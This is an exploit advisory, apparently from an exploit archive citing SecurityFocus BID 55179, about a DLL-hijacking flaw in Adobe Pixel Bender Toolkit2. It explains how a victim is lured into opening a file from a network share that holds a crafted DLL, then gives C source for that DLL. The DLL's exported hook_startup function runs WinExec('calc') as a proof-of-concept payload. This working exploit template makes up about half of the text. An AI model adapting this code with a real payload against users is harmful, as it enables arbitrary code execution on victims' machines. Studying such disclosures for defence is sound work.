source: http://www.securityfocus.com/bid/55179/info

Adobe Pixel Bender Toolkit2 is prone to multiple vulnerabilities that allow attackers execute arbitrary code.

An attacker can exploit these issues by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file. 

#include <windows.h>
#define DllExport __declspec (dllexport)

DllExport void hook_startup() { exp(); }

int exp()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}